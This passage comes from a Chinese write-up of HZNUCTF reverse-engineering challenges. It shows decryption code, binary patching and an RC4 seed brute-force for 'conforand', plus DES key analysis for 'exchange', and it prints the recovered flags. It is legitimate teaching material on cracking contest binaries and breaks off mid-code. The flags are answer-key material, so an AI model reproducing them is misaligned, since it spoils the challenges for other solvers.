punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// First: 0101001001100101010101100110010101010010011001010101001101100101</span>\n    <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">2025</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> RdList<span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">bool</span> v16 <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> rd<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">do</span>\n        <span class=\"token punctuation\">&#123;</span>\n            rd <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span>\n            rd <span class=\"token operator\">&amp;=</span> <span class=\"token number\">0x8000001F</span><span class=\"token punctuation\">;</span>\n            v16 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> i<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>RdList<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> rd<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    v16 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>v16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rd<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">char</span> Key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"ReVeReSe\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>EncFlag <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">^=</span> Key<span class=\"token punctuation\">[</span>count <span class=\"token operator\">%</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> Buffer_Dec<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">Enc3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>inv<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>EncFlag<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Dec2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Enc1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">,</span> RdList<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HZNUCTF&#123;%.64s&#125;\\n\"</span><span class=\"token punctuation\">,</span> Buffer_Dec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</p>\n<h3 id=\"conforand（非预期）\"><a href=\"#conforand（非预期）\" class=\"headerlink\" title=\"conforand（非预期）\"></a>conforand（非预期）</h3><p>从srand查看交叉调用，发现是当前时间戳随机，并非伪随机。</p>\n<p><img src=\"/images/1744633170178-18.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170178-19.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>查看rand交叉调用，发现是再init_sbox函数中调用，并且只获取了一次随机数，应该是利用rand的数值参与sbox生成。</p>\n<p><img src=\"/images/1744633170178-20.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>那么这边的思路就是爆破随机数，但由于是ollvm编译的，代码混乱，使用d810去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。</p>\n<p>接下来是先检验加密对称性，运行发现是会输出加密后的内容。</p>\n<p>检验步骤：</p>\n<ol>\n<li>随便输入一串字符串</li>\n<li>断点rand，修改rand返回值rax寄存器为0。</li>\n<li>得到输出加密内容。</li>\n<li>再次输入字符串，断点在main的rc4调用处，将传参的字符串patch为刚刚程序输出的加密后字节数据。</li>\n<li>断点rand，修改rand返回值rax寄存器为0。</li>\n<li>观察输出加密内容是否为原字符串数据。</li>\n</ol>\n<p>Patch前：</p>\n<p><img src=\"/images/1744633170178-21.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>Patch后：</p>\n<p><img src=\"/images/1744633170178-22.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>发现是对称的，同一个rand值，加密函数也可以用于解密。</p>\n<p><img src=\"/images/1744633170178-23.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170178-24.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>开始Patch原程序流程，用于爆破，将init函数作为hook跳转函数。</p>\n<p>将rand调用改成jmp到init函数。</p>\n<p><img src=\"/images/1744633170178-25.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>init函数头直接改成如下，将0x4068D3地址的数值存到eax，然后再跳转回去，达到一个hook修改rand值结果的效果，所以我们直接加载elf通过修改0x4068D3数值，调用rc4加密来爆破解密密文。</p>\n<p><img src=\"/images/1744633170178-26.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>这边使用这个库加载elf进行调用call：<a href=\"https://github.com/IchildYu/load-elf\">https://github.com/IchildYu/load-elf</a> （河豚鱼，神）</p>\n<p>爆破代码（Key是在原init函数中进行初始化的明文，可以直接找到）：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"include/load_elf.h\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"include/logger.h\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"include/breakpoint.h\"</span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> path <span class=\"token operator\">=</span> <span class=\"token string\">\"./conforand\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">void</span><span class=\"token operator\">*</span> base <span class=\"token operator\">=</span> <span class=\"token function\">load_elf</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">__uint64_t</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>rc4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_symbol_by_offset</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">,</span><span class=\"token number\">0x413170</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"JustDoIt!\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> EncData<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x9c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xfa</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xd5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xa7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xfd</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xdd</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xd4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x3c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xa7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xed</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x8d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xce</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x9e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x9a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xcd</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x2f</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4068D3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n\n                <span class=\"token function\">rc4</span><span class=\"token punctuation\">(</span>EncData<span class=\"token punctuation\">,</span><span class=\"token number\">42</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>EncData<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'H'</span> \n                        <span class=\"token operator\">&amp;&amp;</span> EncData<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'Z'</span>\n                        <span class=\"token operator\">&amp;&amp;</span> EncData<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'N'</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Seed:%d\\n\"</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.42s\\n\"</span><span class=\"token punctuation\">,</span>EncData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p><img src=\"/images/1744633170178-27.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</p>\n<h3 id=\"exchange\"><a href=\"#exchange\" class=\"headerlink\" title=\"exchange\"></a>exchange</h3><p>输入的字符串经过unhex、拆分字节，改变顺序。</p>\n<p>如：<strong>11</strong>-&gt;<strong>0x31 0x31</strong>-&gt;<strong>‘3’ ‘1’ ‘3’ ‘1’</strong>-&gt;<strong>‘3’ ‘3’ ‘1’ ‘1’</strong></p>\n<p>是两个字节为一组进行变换的。</p>\n<p>然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是**”HZNUCTF{“**字串。</p>\n<p><img src=\"/images/1744633170178-28.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>主加密函数，发现只走这上面的部分。</p>\n<p><img src=\"/images/1744633170178-29.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>第一个函数是用**”HZNUCTF{“**字串生成的一串数据，64个整数数据。</p>\n<p>第二个函数是将输入数据8个字节为一组进行加密。</p>\n<p>加密流程：</p>\n<ol>\n<li>4个字节为一组进行翻转</li>\n<li>8字节加密</li>\n<li>4个字节为一组进行翻转</li>\n</ol>\n<p><img src=\"/images/1744633170178-30.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>加密可以看出是DES加密算法，是对称的，key就是刚刚生成的64个整数数值的前32个，那么可以知道后32个就是解密用的key，直接copy该函数，解密时用生成的后32个整数key即可解密。</p>\n<p><img src=\"/images/1744633170178-31.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s1<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span>\n    <span class=\"token 